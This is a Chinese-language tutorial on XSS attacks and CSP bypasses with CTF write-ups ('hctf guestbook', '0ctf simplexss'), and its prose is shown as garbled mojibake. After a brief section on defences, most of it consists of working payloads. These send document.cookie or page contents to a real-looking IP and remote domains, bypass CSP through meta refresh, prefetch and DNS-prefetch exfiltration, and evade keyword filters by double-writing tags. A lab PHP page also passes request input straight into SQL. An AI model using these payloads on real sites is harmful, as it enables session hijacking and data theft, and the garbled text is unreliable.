Scannerï¼‰ã€BurpSuiteç­‰ã€‚è¿˜æœ‰ä¸€äº›ä¸“é—¨é’ˆå¯¹XSSæ¼æ´çš„æ£€æµ‹å·¥å…·ï¼Œå¦‚ï¼šXSSerã€XSSFï¼ˆè·¨ç«™è„šæœ¬æ”»å‡»æ¡†æ¶ï¼‰ã€BeEF(The Browser Exploitation Framework)ç­‰ã€‚ 2ã€é˜²å¾¡ â—ä½¿ç”¨é»‘åå•è¿›è¡Œ â—å¯¹HTMLæ ‡ç­¾æˆ–ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ â—ä½¿ç”¨å†…å®¹å®‰å…¨çš„CSP â—ä½¿ç”¨è®¾è®¡ä¸Šå°±ä¼šè‡ªåŠ¨ç¼–ç çš„æ¡†æ¶ï¼Œå¦‚ï¼šOWASP ESAPIã€React JSã€JSOUPç­‰ï¼Œå¯¹äºJAVAè€Œè¨€ï¼Œå¯ä»¥ä½¿ç”¨ESAPI.encoder().encodeForHTML()å¯¹å­—ç¬¦ä¸²è¿›è¡ŒHTMLç¼–ç ã€‚ â—å¯¹äºåå°„å‹å’Œå­˜å‚¨å‹XSSï¼Œå¯ä»¥åœ¨æ•°æ®è¿”å›ç»™å®¢æˆ·ç«¯æµè§ˆå™¨æ—¶ï¼Œå°†æ•æ„Ÿå­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼Œå¦‚ï¼šå°†å•å¼•å·è¿›è¡Œç¼–ç æ›¿æ¢ï¼ˆåè¿›åˆ¶ç¼–ç 'ã€åå…­è¿›åˆ¶ç¼–ç 'ã€HTMLç¼–ç &amp;aposã€Unicodeç¼–ç \\u0027ç­‰ï¼‰ã€‚ â—å¯¹äºDOMå‹XSSï¼Œå¯ä»¥ä½¿ç”¨ä¸Šä¸‹æ–‡æ•æ„Ÿæ•°æ®ç¼–ç ã€‚å¦‚ï¼šåœ¨PHPä¸­çš„htmlspecialcharsï¼ˆï¼‰ã€htmlentitiesï¼ˆï¼‰å‡½ æ•°å¯ä»¥å°†ä¸€äº›é¢„å®šä¹‰çš„å­—ç¬¦è½¬æ¢ä¸ºHTMLå®ä½“ï¼Œå¦‚ï¼šå°äºè½¬åŒ–ä¸º&lt;ã€å¤§äºè½¬åŒ–ä¸º&gt;ã€åŒå¼•å·è½¬åŒ–ä¸º\"ã€å•å¼•å·è½¬åŒ–ä¸º&amp;aposã€ä¸è½¬åŒ– ä¸º&amp;ç­‰ã€‚ â—å¯ç”¨æµè§ˆå™¨çš„HttpOnlyç‰¹æ€§å¯ä»¥ç»„ç»‡å®¢æˆ·ç«¯è„šæœ¬è®¿é—®cookieã€‚å¦‚ï¼šåœ¨PHPä¸­å¯ä»¥é€šè¿‡ä¸‹é¢çš„ä»£ç è®¾ç½®cookieå¹¶å¯ç”¨HttpOnlyã€‚ &lt;?php Header(\"Set-Cookie:password=123456;httponly\",false); &gt; å…³é”®ç‚¹ï¼š ç›®æ ‡ç½‘ç«™çš„ç›®æ ‡ç”¨æˆ· æµè§ˆå™¨ ä¸è¢«é¢„æœŸçš„ï¼š æ”»å‡»è€…åœ¨è¾“å…¥æ—¶æäº¤äº†å¯æ§çš„è„šæœ¬å†…å®¹ï¼Œç„¶ååœ¨è¾“å‡ºæ—¶è¢«æµè§ˆå™¨è§£ææ‰§è¡Œ â€œè·¨ç«™è„šæœ¬â€é‡ç‚¹æ˜¯è„šæœ¬ï¼šXSSåœ¨æ”»å‡»æ—¶ä¼šåµŒå…¥ä¸€æ®µè¿œç¨‹çš„ç¬¬ä¸‰æ–¹åŸŸä¸Šçš„è„šæœ¬èµ„æºã€‚ æ€»ä¹‹ï¼Œè¦æƒ³å°½ä¸€åˆ‡åŠæ³•å°†ä½ çš„è„šæœ¬å†…å®¹åœ¨ç›®æ ‡ç½‘ç«™ä¸­ç›®æ ‡ç”¨æˆ·çš„æµè§ˆå™¨ä¸Šè§£é‡Šæ‰§è¡Œ 1.åŸºäºå­˜å‚¨å‹çš„XSSæ”»å‡» ä¸Šé¢è¯´äº†è¿™ä¹ˆå¤šè¿˜æ˜¯ä¸çŸ¥é“xssæ”»å‡»åº”è¯¥è¿ç”¨åœ¨å“ªäº›åœºæ™¯ä¸‹ï¼Œä¸‹é¢æˆ‘ä»¬æŠŠXSSåˆ†ä¸ºæœ‰CSPä¿æŠ¤å’Œæ— CSPä¿æŠ¤ä¸¤ä¸ªåœºæ™¯æ¥å®ç°ã€‚ 0x01 æ— CSPä¿æŠ¤ä¸‹çš„XSS 1.ç›´æ¥åµŒå…¥å‹ å½“è¿‡æ»¤çš„ä¸œè¥¿è¾ƒå°‘æ—¶ï¼Œå¯ä»¥ä¼˜å…ˆè€ƒè™‘è¿™ä¸ªã€‚è¿™ç§xssè§¦å‘æ–¹å¼æ¯”è¾ƒç›´æ¥ï¼Œç›´æ¥åµŒå…¥èƒ½å¤Ÿxssçš„jsä»£ç ï¼Œä¸‹é¢çœ‹ä¸€ä¸ªä¾‹å­ã€‚ //adminè®¿é—®é¡µé¢ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;xss&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var img = new Image(); img.src = 'http://45.78.29.252:8888/?a='+document.cookie; document.getElementsByTagName(\"head\")[0].appendChild(img); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; jsä»£ç ä¸å›¾ç‰‡åµŒå…¥headä¸­ä¸€èµ·è§£æï¼Œä¹‹åå°†è·å–çš„cookieå‘é€è‡³xsså¹³å° 2.importå¯¼å…¥å‹ ç»å¸¸ç”¨äºè¿‡æ»¤æ¯”è¾ƒä¸¥æ ¼çš„æƒ…å†µï¼Œç»è¿‡å®éªŒå‘ç°linkçš„å±æ€§relå€¼ä¸ºimportæ—¶ä¼šå°†èµ„æºè¯·æ±‚å›æ¥å¹¶ä¸€åŒè§£æï¼Œæ³¨æ„å¿…é¡»æ˜¯å®Œæ•´çš„èµ„æºä¾‹å¦‚HTMLã€PHPã€JSç­‰ã€‚è¯·æ±‚çš„èµ„æºå¿…é¡»è¦è®¾ç½®ä¸ºå…è®¸è·¨åŸŸåŠ è½½çš„å“åº”å¤´ã€‚ &lt;!-- æ— csp è¿œç¨‹åŒ…å«jsæ–‡ä»¶ --&gt;adminè®¿é—®é¡µé¢ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=\"utf-8\"&gt; &lt;title&gt;æ— csp/è¿œç¨‹åŒ…å«jsæ–‡ä»¶/import&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;link rel=import href=http://yzbbd666.com/2.php&gt; &lt;/body&gt; &lt;/html&gt; ä¸‹é¢æ˜¯http://yzbbd666.com/2.phpæ–‡ä»¶å†…å®¹æ³¨æ„å¡«å†™Access-Control-Allow-Origin &lt;?php header(\"Access-Control-Allow-Origin: *\"); echo 1; ?&gt; &lt;script src=\"https://cdn.bootcss.com/jquery/2.2.4/jquery.min.js\"&gt;&lt;/script&gt; &lt;script type=\"text/javascript\"&gt; $.get(\"http://127.0.0.1/flag.php\",function(data){ //alert(data); location.href=\"http://45.78.29.252:8888/?a=\"+escape(data); }); &lt;/script&gt; æˆ‘ä»¬å‘ç°è®¿é—®æˆåŠŸäº†ï¼Œlinkçš„importä¼šé¦–å…ˆå°†è®¿é—®çš„èµ„æºæ‰§è¡Œæ‰€ä»¥ä¼šè§¦å‘xssæ¼æ´ï¼Œå°†ç›—å–çš„æ‰cookieå€¼å‘é€è‡³æœåŠ¡å™¨ 3.scriptå¯¼å…¥å‹ ä¸€èˆ¬ä¹Ÿæ˜¯è¾“å…¥é™åˆ¶æ¯”è¾ƒå¤šçš„æ—¶å€™ï¼Œè¯·æ±‚è®¿é—®å¯ä»¥åˆ©ç”¨scriptçš„è¿œç¨‹jsåŠ è½½ã€‚ //adminè®¿é—®é¡µé¢ &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;xss&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script src=http://yzbbd666.com/ld.js&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; http://yzbbd666.com/ld.jså†…å®¹å¦‚ä¸‹ï¼Œæ³¨æ„è¿™é‡Œæ˜¯jsæ ¼å¼ var img = new Image(); img.src = 'http://45.78.29.252:8888/?a='+document.cookie; document.getElementsByTagName(\"head\")[0].appendChild(img); è¯´æ˜scriptåŠ è½½å¹¶æ‰§è¡Œäº†è¿œç¨‹jsè„šæœ¬ï¼Œå¹¶å°†cookieå‘é€è‡³xsså¹³å° 0x02 æœ‰CSPä¿æŠ¤ä¸‹çš„XSS CSPä¸­æ–‡æ„æ€æ˜¯å†…å®¹å®‰å…¨ç­–ç•¥ï¼Œä¸ºäº†ä¿æŠ¤æ–‡æ¡£å†…å®¹è€Œå®æ–½çš„ç­–ç•¥ï¼Œé¦–å…ˆç®€ç­”ä»‹ç»ä¸€ä¸‹CSPç›¸å…³å†…å®¹ï¼Œå…¶æ¬¡è®²è§£ä¸€ä¸‹ç»•è¿‡æ–¹æ³•ã€‚ 1.å†…å®¹å®‰å…¨ç­–ç•¥ ï¼ˆ1ï¼‰ CSPç­–ç•¥ ä¸€ä¸ªCSPå¤´ç”±å¤šç»„CSPç­–ç•¥ç»„æˆï¼Œä¸­é—´ç”±åˆ†å·åˆ†éš”ï¼Œå°±åƒè¿™æ ·ï¼š Content-Security-Policy: default-src â€˜selfâ€™ www.baidu.com; script-src â€˜unsafe-inlineâ€™ å…¶ä¸­æ¯ä¸€ç»„ç­–ç•¥åŒ…å«ä¸€ä¸ªç­–ç•¥æŒ‡ä»¤å’Œä¸€ä¸ªå†…å®¹æºåˆ—è¡¨ ï¼ˆ2ï¼‰ å¸¸ç”¨çš„ç­–ç•¥æŒ‡ä»¤ default-src æŒ‡ä»¤å®šä¹‰äº†é‚£äº›æ²¡æœ‰è¢«æ›´ç²¾ç¡®æŒ‡ä»¤æŒ‡å®šçš„å®‰å…¨ç­–ç•¥ã€‚è¿™äº›æŒ‡ä»¤åŒ…æ‹¬ï¼š child-srcæŒ‡å®šå®šä¹‰äº† web workers ä»¥åŠåµŒå¥—çš„æµè§ˆä¸Šä¸‹æ–‡ connect-srcå®šä¹‰äº†è¯·æ±‚ã€XMLHttpRequestã€WebSocket å’Œ EventSource çš„è¿æ¥æ¥æºã€‚ font-srcå®šä¹‰äº†å­—ä½“åŠ è½½çš„æœ‰æ•ˆæ¥æº img-srcå®šä¹‰äº†é¡µé¢ä¸­å›¾ç‰‡å’Œå›¾æ ‡çš„æœ‰æ•ˆæ¥æº media-srcé’ˆå¯¹åª’ä½“å¼•å…¥çš„ HTML å¤šåª’ä½“çš„åŠ è½½ç­–ç•¥ã€‚ object-srcæ’ä»¶(æ¯”å¦‚ Flash)ï¼Œé’ˆå¯¹ ã€ æˆ– ç­‰æ ‡ç­¾å¼•å…¥çš„ flash ç­‰æ’ä»¶çš„åŠ è½½ç­–ç•¥ã€‚ style-srcå®šä¹‰äº†é¡µé¢ä¸­CSSæ ·å¼çš„æœ‰æ•ˆæ¥æº script-src å®šä¹‰äº†é¡µé¢ä¸­Javascriptçš„æœ‰æ•ˆæ¥æºï¼ˆå¤–éƒ¨è„šæœ¬ï¼‰ å†…å®¹æº å†…å®¹æºæœ‰ä¸‰ç§ï¼šæºåˆ—è¡¨ã€å…³é”®å­—å’Œæ•°æ® æºåˆ—è¡¨ æºåˆ—è¡¨æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ŒæŒ‡å®šäº†ä¸€ä¸ªæˆ–å¤šä¸ªäº’è”ç½‘ä¸»æœºï¼ˆé€šè¿‡ä¸»æœºåæˆ– IP åœ°å€ï¼‰ï¼Œå’Œå¯é€‰çš„æˆ–ç«¯å£å·ã€‚ç«™ç‚¹åœ°å€å¯ä»¥åŒ…å«å¯é€‰çš„é€šé…ç¬¦å‰ç¼€ (æ˜Ÿå·, â€˜â€˜)ï¼Œç«¯å£å·ä¹Ÿå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ (åŒæ ·æ˜¯ â€˜â€˜) æ¥è¡¨æ˜æ‰€æœ‰åˆæ³•ç«¯å£éƒ½æ˜¯æœ‰æ•ˆæ¥æºã€‚ä¸»æœºé€šè¿‡ç©ºæ ¼åˆ†éš”ã€‚ æœ‰æ•ˆçš„ä¸»æœºè¡¨è¾¾å¼åŒ…æ‹¬ï¼š http://*.foo.com ï¼ˆåŒ¹é…æ‰€æœ‰ä½¿ç”¨ httpåè®®åŠ è½½ foo.com ä»»ä½•å­åŸŸåçš„å°è¯•ã€‚ï¼‰ mail.foo.com:443 ï¼ˆåŒ¹é…æ‰€æœ‰è®¿é—® mail.foo.com çš„ 443 ç«¯å£ çš„å°è¯•ã€‚ï¼‰ https://store.foo.com ï¼ˆåŒ¹é…æ‰€æœ‰ä½¿ç”¨ httpsåè®®è®¿é—® store.foo.com çš„å°è¯•ã€‚ï¼‰ å¦‚æœç«¯å£å·æ²¡æœ‰è¢«æŒ‡å®šï¼Œæµè§ˆå™¨ä¼šä½¿ç”¨æŒ‡å®šåè®®çš„é»˜è®¤ç«¯å£å·ã€‚å¦‚æœåè®®æ²¡æœ‰è¢«æŒ‡å®šï¼Œæµè§ˆå™¨ä¼šä½¿ç”¨è®¿é—®è¯¥æ–‡æ¡£æ—¶çš„åè®®ã€‚ å…³é”®å­— â€˜noneâ€™ ä»£è¡¨ç©ºé›†ï¼›å³ä¸åŒ¹é…ä»»ä½• URLã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚ â€˜selfâ€™ ä»£è¡¨å’Œæ–‡æ¡£åŒæºï¼ŒåŒ…æ‹¬ç›¸åŒçš„ URL åè®®å’Œç«¯å£å·ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚ â€˜unsafe-inlineâ€™ å…è®¸ä½¿ç”¨å†…è”èµ„æºï¼Œå¦‚å†…è”çš„scriptå…ƒç´ ã€javascript: URLã€å†…è”çš„äº‹ä»¶å¤„ç†å‡½æ•°å’Œå†…è”çš„styleå…ƒç´ ï¼Œä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚ â€˜unsafe-evalâ€™ å…è®¸ä½¿ç”¨ eval() ç­‰é€šè¿‡å­—ç¬¦ä¸²åˆ›å»ºä»£ç çš„æ–¹æ³•ã€‚ä¸¤ä¾§å•å¼•å·æ˜¯å¿…é¡»çš„ã€‚ Content-Security-Policy: default-src 'self' trustedscripts.foo.com æ•°æ® data: å…è®¸data: URIä½œä¸ºå†…å®¹æ¥æºã€‚ mediastream: å…è®¸mediastream: URIä½œä¸ºå†…å®¹æ¥æºã€‚ Content-Security-Policy: default-src 'self'; img-src 'self' data:; media-src mediastream: 2.è·³è½¬ metaæ ‡ç­¾è·³è½¬ åœ¨default-src â€˜noneâ€™çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ä½¿ç”¨metaæ ‡ç­¾å®ç°è·³è½¬ //adminè®¿é—®é¡µé¢ &lt;?php header(\"Content-Security-Policy: default-src 'none';\") ;//è¿™é‡Œå¯ä»¥è®¾ç½®CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;meta http-equiv=\"refresh\" content=\"1;url=http://www.xss.com/x.php?c=[cookie]\" &gt; &lt;/head&gt; &lt;body&gt; &lt;/body&gt; &lt;/html&gt; å‘ç°å›¾ç‰‡ä¸èƒ½è¢«è®¿é—®ï¼Œä½†metaæ ‡ç­¾ä¸­çš„å†…å®¹å¯ä»¥è¢«è®¿é—®ï¼ŒæˆåŠŸå¼¹è‡³xsså¹³å°ã€‚ å°tipï¼šå¦‚ä½•è·å–cookie (1)é€šè¿‡document.cookieè·å–æ‰€æœ‰çš„cookieå€¼ï¼Œè·å–åˆ°ä¸€ä¸ªcookieæ‰€æœ‰å€¼åœ¨ä¸€èµ·çš„å­—ç¬¦ä¸²ã€‚ (2)å› ä¸ºæ‰€æœ‰çš„cookieéƒ½æ˜¯ä»¥åˆ†å·éš”å¼€çš„ï¼Œæ‰€æœ‰ä½¿ç”¨split(â€˜;â€™)å°†è¿™ä¸ªå­—ç¬¦ä¸²åˆ‡å¼€å˜æˆæ•°ç»„ï¼Œå­˜èµ·æ¥ã€‚ (3)åˆ¤æ–­æ•°ç»„ä¸­æ¯ä¸€é¡¹æœ‰æ²¡æœ‰åŒ…å«cookieåå­—çš„ï¼Œå¦‚æœæœ‰ï¼ŒæŠŠå¯¹åº”çš„å€¼å–å‡ºæ¥å°±è¡Œã€‚ scriptè„šæœ¬è·³è½¬ åœ¨å…è®¸unsafe-inlineçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç”¨window.locationï¼Œæˆ–è€…window.openä¹‹ç±»çš„æ–¹æ³•è¿›è¡Œè·³è½¬ç»•è¿‡ã€‚ &lt;script&gt; window.location=\"http://www.xss.com/x.php?c=[cookie]\"; &lt;/script&gt; &lt;script&gt; window.location.href=\"flag.php\"; &lt;/script&gt; prefetché¢„åŠ è½½ç»•è¿‡ CSPå¯¹linkæ ‡ç­¾çš„é¢„åŠ è½½åŠŸèƒ½è€ƒè™‘ä¸å®Œå–„ã€‚ åœ¨Chromeä¸‹ï¼Œå¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ ‡ç­¾å‘é€cookie &lt;link rel=\"prefetch\" href=\"http://www.xss.com/x.php?c=[cookie]\"&gt; åœ¨Firefoxä¸‹ï¼Œå¯ä»¥å°†cookieä½œä¸ºå­åŸŸåï¼Œç”¨dnsé¢„è§£æçš„æ–¹å¼æŠŠcookieå¸¦å‡ºå»ï¼ŒæŸ¥çœ‹dnsæœåŠ¡å™¨çš„æ—¥å¿—å°±èƒ½å¾—åˆ°cookie &lt;link rel=\"dns-prefetch\" href=\"//[cookie].xxx.ceye.io\"&gt; å®éªŒä»£ç  adminè®¿é—®ç•Œé¢ æ³¨æ„è¿™é‡Œå…è®¸é‡Œå†…è”è„šæœ¬ï¼Œæ‰€ä»¥ç†æ‰€å½“ç„¶çš„å¯ä»¥ä½¿ç”¨è·³è½¬çš„æ–¹æ³•è·å–cookieçš„å€¼ã€‚ &lt;?php header(\"Content-Security-Policy: default-src 'self';script-src 'self' 'unsafe-inline';\") ;//è¿™é‡Œå¯ä»¥è®¾ç½®CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt; var n0t = document.createElement(\"link\"); n0t.setAttribute(\"rel\", \"prefetch\"); n0t.setAttribute(\"href\", \"http://45.78.29.252:8888/?a=\" + String(document.getElementsByTagName(\"html\")[0].innerHTML).substring(0,100)); document.head.appendChild(n0t); &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; æˆåŠŸè·å–cookieå€¼ 0x03 XSSç»•è¿‡æŠ€å·§ æ£€ç´¢åˆ°äº†ä¸€ä¸ªé«˜çº§xssç»•è¿‡å¤‡å¿˜å½•ï¼ˆæ™¦æ¶©éš¾æ‡‚ï¼‰ç­‰æ—¥åæ‹œè¯»å§ XSS è¿‡æ»¤å™¨è§„é¿ - OWASP å¤‡å¿˜å•ç³»åˆ— 0x04 å®ä¾‹è§£æ è¿™ä¸€éƒ¨åˆ†å‘¢å°†ä½œä¸ºé•¿æœŸæ›´æ–°çš„åœ°æ–¹å¦‚æœé‡åˆ°å¥½çš„xssé¢˜ç›®å¯ä»¥è”ç³»æˆ‘ï¼Œå°†ä¸€äº›ä¸é”™çš„xssé¢˜ç›®æ€»ç»“åœ¨è¿™é‡Œï¼Œä¸ºçš„æ˜¯æŠŠç†è®ºçŸ¥è¯†ä¸å®è·µç›¸ç»“åˆ 0x1 htcf guestbook ä»ä»£ç ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°åŸºæœ¬çš„è¿‡æ»¤ function filter($string) { $escape = array('\\'','\\\\\\\\'); $escape = '/' . implode('|', $escape) . '/'; $string = preg_replace($escape, '_', $string); $safe = array('select', 'insert', 'update', 'delete', 'where'); $safe = '/' . implode('|', $safe) . '/i'; $string = preg_replace($safe, 'hacker', $string); $xsssafe = array('img','script','on','svg','link'); $xsssafe = '/' . implode('|', $xsssafe) . '/i'; return preg_replace($xsssafe, '', $string); } å‡½æ•°è§£æï¼š 1ã€explode()å‡½æ•° æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ï¼š 2ã€implode()å‡½æ•° æŠŠæ•°ç»„å…ƒç´ ç»„åˆä¸ºå­—ç¬¦ä¸²ï¼š &lt;?php $str = '107_lab_2017'; $array=explode('_', $str);//ä»¥ä¸‹åˆ’çº¿ä¸ºåˆ†éš”ç¬¦å°†å­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ print_r($array); echo implode('_', $array);//ä»¥ä¸‹åˆ’çº¿ä¸ºåˆ†éš”ç¬¦å°†æ•°ç»„åˆå¹¶æˆå­—ç¬¦ä¸² ?&gt; æˆ‘ä»¬çœ‹åˆ°å…¶å®åªæœ‰å¾ˆå°‘çš„è¿‡æ»¤ï¼Œè€Œä¸”æ˜¯å•å±‚çš„ï¼Œå¯¹äºxssæ¥è¯´ï¼Œåªéœ€è¦å¤å†™2æ¬¡å°±å¯ä»¥ç»•è¿‡äº†ï¼Œç±»ä¼¼äº scrscriptiptè¿™æ ·ã€‚ æ‰€ä»¥å…¶å®å…³é”®åœ¨äºCSP Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self' è¿™é‡Œä¸Šè¿°éƒ½å·²ç»æåˆ°ç»•è¿‡æ–¹æ³•ä¸»è¦æœ‰ä¸¤ç§ï¼Œä¸€ç§ç›´æ¥åˆ©ç”¨è·³è½¬ï¼Œç¬¬äºŒç§åˆ©ç”¨é¢„åŠ è½½ ä¸ç†Ÿæ‚‰çš„äººå¯èƒ½å¹¶ä¸æ¸…æ¥šå…¶ä¸­çš„CSPæœ‰ä»€ä¹ˆæ ·çš„é—®é¢˜ï¼Œäº‹å®ï¼Œæ•´ä¸ªCSPé™¤äº†é™å®šäº†åŸŸä»¥å¤–ï¼Œæ²¡æœ‰åšä»»ä½•çš„é™åˆ¶ï¼Œå¯ä»¥æ‰§è¡Œä»»æ„çš„jsï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†ä½¿ç”¨äººæ•°æ¯”è¾ƒå¤šçš„éé¢„æœŸåšæ³•ã€‚ 1.è·³è½¬ç»•è¿‡ï¼š &lt;scrscriptipt&gt;window.open(\" http://xxxx:8080/cookie.asp?msg= \"+document.body)&lt;/scrscr iptipt&gt; &lt;scrscriptipt&gt;window.locatioonn.href%3d\"http%3a// www.example.com/xss/write.php%3fdomain%3d \"%2bescape(document.cookie)%3b&lt;/sscriptcript&gt; &lt;scrscriptipt&gt;var a=document.createElement(\"a\");a.href=' http://xss.com/?cookie= '+escape(document.cookie);a.click();&lt;/sscriptcript&gt; ä¸Šé¢å‡ ç§æ€è·¯ç±»ä¼¼ï¼Œé€šè¿‡æ„é€ æ–°å¼€é¡µé¢æˆ–è€…è·³è½¬æ¥è§£å†³åŸŸé™åˆ¶ï¼Œç”±äºjså¯ä»¥ä»»æ„æ„é€ ï¼Œæ‰€ä»¥è¿™é‡Œä¹Ÿå°±é€šè¿‡ç‰¹åˆ«çš„æ–¹å¼ç»•è¿‡äº†åŸæœ¬çš„é™åˆ¶ã€‚ 2.chromeå¯¹CSPæ”¯æŒçš„ä¸å®Œæ•´ç»•è¿‡ é¢„åŠ è½½ç»•è¿‡ ä»æ–‡ç« ä¸­å¯ä»¥è·å¾—å¯¹æ¼æ´çš„æ•´ä½“äº†è§£ï¼Œä¸»è¦æ˜¯2ç¯‡ ç¬¬ä¸€ç¯‡ lorexxarå¤§ä½¬çš„ åå°botä½¿ç”¨çš„ä¹Ÿæ­£æ˜¯chromeæµè§ˆå™¨ï¼Œç”±äºæµè§ˆå™¨å¯¹CSPç‰¹æ€§æ”¯æŒçš„ä¸å®Œæ•´ï¼Œå¯¼è‡´linkæ ‡ç­¾çš„ç™½åå•ç‰¹æ€§å­˜åœ¨è·¨åŸŸè¯·æ±‚çš„èƒ½åŠ›ï¼Œæ‰€ä»¥æ„é€ payload &lt;Scscriptript&gt;var n0t = document.createElement(\"liscriptnk\");n0t.setAttribute(\"rel\", \"prefetch\");n0t.setAttribute(\"href\", \"//xxx:2333/\" + document.cookie);document.head.appendChild(n0t);&lt;/Scscriptript&gt; åé¢xsså¹³å°æˆ–è€…vpsæ¥å—ä¸€å‘æå®š 0x05 0ctf simplexss å¤ç°ä¸€ä¸‹xssç¯å¢ƒã€‚ å®éªŒç¯å¢ƒ: 192.168.43.182 ï¼ˆæœ¬åœ°ä¸»æœºï¼‰ 192.168.43.165 ï¼ˆflagæ‰€åœ¨åœ°ï¼‰ 192.168.43.165 1.php ä¸»è¦å®ç°äº†ç•™è¨€æ¿çš„åŠŸèƒ½ &lt;?php #header(\"Content-Security-Policy: default-src 'self';\") ;//è¿™é‡Œå¯ä»¥è®¾ç½®CSP ?&gt; &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;XSS&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;?php $a = $_GET['a']; $link = new mysqli(\"localhost\",\"root\",\"*****\",\"test\") or die(\"error\".mysql_error()); if ($link) { echo 1; $result = $link-&gt;query(\"INSERT INTO yz VALUES ('$a','1','2','3')\"); if($result) echo 2; $re = $link-&gt;query(\"SELECT * FROM yz\"); for($i = 0;$i&lt;$re-&gt;num_rows;$i++) { $row = $re-&gt;fetch_row(); echo $row[0]; } } ?&gt; &lt;script &gt; document.getElementsByClassName(\"input\"); document. &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 192.168.43.182 3.php &lt;?php header(\"Access-Control-Allow-Origin: *\"); ?&gt; &lt;script&gt; function getinfo(str) { var node=document.createElement(\"script\"); node.type=\"text/javascript\"; node.src=\"http://192.168.43.182/2.php?a=1234\"+escape(str); document.getElementsByTagName(\"HEAD\")[0].appendChild(node); } var xmlhttp=new XMLHttpRequest(); xmlhttp.open(\"GET\",\"http://127.0.0.1/flag.php\",true); xmlhttp.onreadystatechange=function() { //if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) { getinfo(xmlhttp.responseText); } } xmlhttp.send(); &lt;/script&gt; åœ¨æœ¬åœ°æ‰“å¼€æµè§ˆå™¨è¾“å…¥ http://192.168.43.165/1.php?a=&lt;link%20rel=import%20href=http://192.168.43.182/3.php&gt; import ä¼šå¯¼å…¥è¿œç¨‹èµ„æºå¹¶æ‰§è¡Œ å½“flagç«¯æ‰“å¼€1.phpæŸ¥çœ‹ç•™è¨€æ¿æ—¶ä¼šä½¿å¾—3.phpè„šæœ¬æ‰§è¡Œï¼Œä»è€Œå°†flagçš„å†…å®¹å‘é€è‡³æœ¬åœ°ã€‚ ä»¥ä¸Šæˆ‘ç›®å‰çœ‹ä¸æ‡‚ï¼Œç•™ç€å§â€¦ 5.1 å¸¸è§æ ‡ç­¾åŠå±æ€§ ä¸‹é¢æˆ‘åˆ—ä¸¾çš„æ ‡ç­¾å¤§éƒ¨åˆ†æ˜¯å¯ä»¥è‡ªåŠ¨è§¦å‘jsä»£ç çš„ï¼Œæ— éœ€ç”¨æˆ·å»äº¤äº’ï¼Œå¤§éƒ¨åˆ†æƒ…å†µä¸‹æˆ‘ä»¬ä¹Ÿæ˜¯å¸Œæœ›æ˜¯è‡ªåŠ¨è§¦å‘è€Œä¸æ˜¯ç­‰ç”¨æˆ·å»è§¦å‘ã€‚ scirpt æ ‡ç­¾ æ ‡ç­¾ç”¨äºå®šä¹‰å®¢æˆ·ç«¯è„šæœ¬ï¼Œæ¯”å¦‚ JavaScriptã€‚ &lt;script&gt;alert(1);&lt;/script&gt; &lt;script&gt;alert(&quot;xss&quot;);&lt;/script&gt; ä¾‹å¦‚ï¼š &lt;?php ini_set(&quot;display_errors&quot;, 0); $str = $_GET[&quot;name&quot;]; echo &quot;&lt;h2 align=center&gt;æ¬¢è¿ç”¨æˆ·&quot;.$str.&quot;&lt;/h2&gt;&quot;; ?&gt; **åˆ©ç”¨payloadï¼š** &lt;script&gt;alert(1)&lt;/script&gt; #### img æ ‡ç­¾ æ ‡ç­¾å®šä¹‰ HTML é¡µé¢ä¸­çš„å›¾åƒã€‚ &lt;img src=1 onerror=alert(1);&gt; &lt;img src=1 onerror=alert(&quot;xss&quot;);&gt; #### input æ ‡ç­¾ æ ‡ç­¾è§„å®šäº†ç”¨æˆ·å¯ä»¥åœ¨å…¶ä¸­è¾“å…¥æ•°æ®çš„è¾“å…¥å­—æ®µã€‚ onfocus äº‹ä»¶åœ¨å¯¹è±¡è·å¾—ç„¦ç‚¹æ—¶å‘ç”Ÿï¼š &lt;input onfocus=alert(1);&gt; ç«äº‰ç„¦ç‚¹ï¼Œä»è€Œè§¦å‘onbluräº‹ä»¶ï¼š &lt;input onblur=alert(1) autofocus&gt;&lt;input autofocus&gt; input æ ‡ç­¾çš„ autofocus å±æ€§è§„å®šå½“é¡µé¢åŠ è½½æ—¶ å…ƒç´ 